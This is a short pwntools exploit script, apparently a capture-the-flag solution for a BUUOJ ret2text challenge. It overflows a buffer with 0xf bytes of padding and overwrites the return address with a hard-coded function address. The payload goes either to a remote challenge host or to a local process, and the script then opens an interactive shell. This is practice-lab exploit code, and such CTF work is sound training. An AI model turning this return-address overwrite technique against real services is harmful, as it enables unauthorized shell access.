'''
@Author       : 白银
@Date         : 2023-03-10 19:03:47
@LastEditors  : 白银
@LastEditTime : 2023-03-10 19:44:35
@FilePath     : /pwn/pwn1.py
@Description  : ret2text类型  https://buuoj.cn/challenges#rip
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *

set_arch = 0

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './pwn1'
elf = ELF(pwnfile)

state = 0  # 0为远程

if state == 0:
    # io = remote("192.168.61.139", 8888)
    io = remote("node4.buuoj.cn", 26852)
    # libc = ELF('/home/jack/Desktop/libc.so.6')

    if set_arch == 0 or set_arch == 1:
        libc = ELF('/home/jack/Desktop/x64_libc.so.6')
    else:
        libc = ELF('/home/jack/Desktop/x86_libc.so.6')
else:
    io = process(pwnfile)

    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0xf # ida看，s和s差多少
return_addr = 0x401186 # p &fun
payload = flat(['a' * padding, return_addr])

delimiter = 'please input'

if state == 0:
    io.sendline(payload)  # 远程用
else:
    io.sendlineafter(delimiter, payload)  #本地用

io.interactive()